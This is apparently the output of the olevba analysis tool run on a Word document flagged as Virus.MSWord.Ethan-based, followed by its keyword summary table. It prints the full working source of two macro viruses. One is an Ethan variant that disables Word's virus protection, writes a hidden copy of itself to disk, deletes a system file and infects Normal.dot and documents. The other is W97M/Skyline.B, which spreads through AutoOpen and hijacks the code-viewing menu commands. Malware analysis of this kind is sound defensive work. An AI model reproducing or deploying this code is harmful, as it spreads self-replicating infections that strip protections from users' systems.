olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-41e87e2b97ef31479836da89fd7c9bba6824dc5a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-41e87e2b97ef31479836da89fd7c9bba6824dc5a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: Virus.MSWord.Ethan-based-41e87e2b97ef31479836da89fd7c9bba6824dc5a - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
Carrier(ModulName).Export "c:\ascii.vxd"
host.Import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

